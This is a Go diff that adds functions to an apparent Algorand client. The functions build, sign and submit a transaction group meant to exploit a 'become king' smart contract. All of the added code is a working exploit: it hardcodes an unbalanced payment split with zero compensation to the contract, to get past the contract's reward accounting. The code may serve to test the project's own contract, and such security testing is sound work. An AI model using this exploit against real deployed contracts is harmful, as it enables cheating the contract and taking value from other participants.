@@ -246,3 +246,130 @@ func debugTxn(ctx context.Context, client *algod.Client, txns []types.SignedTxn)
 
 	return nil
 }
+
+func BecomeKingUnbalancedRewardsExploit(
+	ctx context.Context,
+	client *algod.Client,
+	debug bool,
+	params BecomeKingParams,
+	waitRounds uint64,
+) (models.PendingTransactionInfoResponse, error) {
+	signedTxnBytes, _, err := MakeUnbalancedRewardsExploitTx(params)
+	if err != nil {
+		return models.PendingTransactionInfoResponse{}, errors.WithStack(err)
+	}
+
+	return sendWaitTransaction(ctx, client, signedTxnBytes, waitRounds)
+}
+
+func MakeUnbalancedRewardsExploitTx(params BecomeKingParams) ([]byte, []types.SignedTxn, error) {
+	suggestedParams := params.txParams
+	accounts := []string{}
+	if params.isReignEnded() && params.state.King != "" {
+		accounts = append(accounts, params.state.King)
+		suggestedParams.FlatFee = true
+		suggestedParams.Fee = transaction.MinTxnFee * 2
+	}
+
+	// NOOP TX.
+	noOpTx, err := transaction.MakeApplicationNoOpTx(
+		params.appIndex,
+		[][]byte{[]byte("todo_operation")},
+		accounts,
+		nil,
+		nil,
+		suggestedParams,
+		params.sender.Address,
+		[]byte(fmt.Sprintf(noteFormat, params.message)),
+		types.Digest{},
+		[32]byte{},
+		types.ZeroAddress,
+	)
+	if err != nil {
+		return nil, nil, errors.WithStack(err)
+	}
+
+	transactions := []types.Transaction{}
+	transactions = append(transactions, noOpTx)
+
+	totalPayAmount := params.getPayAmount()
+
+	// Exploit the contract by unbalancing the rewards.
+	// Hardcode the distribution based on the exploit scenario.
+	adminFeePercentage := uint64(5)
+	rewardPercentage := uint64(95)
+	compensationPercentage := uint64(0) // 0% compensation.
+
+	adminFee := multiplyPercentage(totalPayAmount, adminFeePercentage)
+	reward := multiplyPercentage(totalPayAmount, rewardPercentage)
+	comp := totalPayAmount * compensationPercentage
+
+	// Payment of fee to contract admin.
+	adminFeeTx, err := transaction.MakePaymentTxn(
+		params.sender.Address.String(),
+		params.state.Admin,
+		adminFee,
+		[]byte(fmt.Sprintf(noteFormat, "admin_fee_tx")),
+		"",
+		params.txParams)
+	if err != nil {
+		return nil, nil, errors.WithStack(err)
+	}
+
+	transactions = append(transactions, adminFeeTx)
+
+	compTx, err := transaction.MakePaymentTxn(
+		params.sender.Address.String(),
+		crypto.GetApplicationAddress(params.appIndex).String(),
+		comp,
+		[]byte(fmt.Sprintf(noteFormat, "comp_tx")),
+		"",
+		params.txParams)
+	if err != nil {
+		return nil, nil, errors.WithStack(err)
+	}
+
+	transactions = append(transactions, compTx)
+
+	// If there is no previous king we omit this tx.
+	if params.isKingSet() {
+		rewardTx, err := transaction.MakePaymentTxn(
+			params.sender.Address.String(),
+			params.state.King,
+			reward,
+			[]byte(fmt.Sprintf(noteFormat, "reward_tx")),
+			"",
+			params.txParams)
+		if err != nil {
+			return nil, nil, errors.WithStack(err)
+		}
+
+		transactions = append(transactions, rewardTx)
+	}
+
+	groupedTxs, err := transaction.AssignGroupID(transactions, "")
+	if err != nil {
+		return nil, nil, errors.WithStack(err)
+	}
+
+	signedGrpBytes := []byte{}
+	signedGroup := []types.SignedTxn{}
+	signedTx := types.SignedTxn{}
+	for _, tx := range groupedTxs {
+		_, signedBytes, err := crypto.SignTransaction(params.sender.PrivateKey, tx)
+		if err != nil {
+			return nil, nil, errors.WithStack(err)
+		}
+
+		signedGrpBytes = append(signedGrpBytes, signedBytes...)
+
+		err = msgpack.Decode(signedBytes, &signedTx)
+		if err != nil {
+			return nil, nil, errors.WithStack(err)
+		}
+
+		signedGroup = append(signedGroup, signedTx)
+	}
+
+	return signedGrpBytes, signedGroup, nil
+}
